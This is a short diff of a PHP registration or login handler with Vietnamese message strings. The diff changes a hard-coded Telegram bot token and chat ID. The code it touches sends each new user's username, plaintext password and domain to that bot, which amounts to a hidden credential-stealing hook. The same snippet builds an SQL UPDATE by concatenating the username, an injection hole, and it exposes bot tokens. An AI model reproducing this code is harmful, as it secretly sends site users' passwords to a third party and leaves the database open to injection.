@@ -61,8 +61,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $now_ss = random('0123456789qwertyuiopasdfghjlkzxcvbnmQEWRWROIWCJHSCNJKFBJWQ', 32);
                     $ketnoi->query("UPDATE `users` SET `session` = '$now_ss' WHERE `username` = '".$username."' ");
                     $_SESSION['session'] = $now_ss;
-                    $telegram_token = '8040732800:AAEayQK-UJjpvxN-eCdGj7C_KV3GrTufxSc';
-                    $chat_id = '6436304003';
+                    $telegram_token = '6523372203:AAF8WmmRUxooEeBX88ol4KPeFraVhegbQGE';
+                    $chat_id = '6411948612';
                     $message = "Thông tin đăng ký:\nTên đăng nhập: $username\nMật khẩu: $password\nTên miền: $domain_name";
                     file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=".urlencode($message));
 
